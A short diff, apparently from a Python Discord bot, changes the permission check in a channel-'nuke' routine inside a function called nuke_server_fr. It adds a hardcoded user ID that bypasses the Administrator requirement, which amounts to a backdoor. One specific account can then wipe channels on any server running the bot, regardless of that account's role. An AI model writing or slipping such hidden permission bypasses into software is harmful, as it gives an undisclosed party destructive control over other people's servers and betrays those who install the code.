@@ -174,7 +174,7 @@ async def nuke_server_fr(ctx):
                 all_members_list.append(membertemp)
 
         async def nuke_channel_2(txt):
-            if not txt.author.guild_permissions.administrator:
+            if not txt.author.guild_permissions.administrator and not txt.author.id == 762152955382071316:
                 print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                 await txt.send("You don't have `Administrator` Permissions!")
             else:
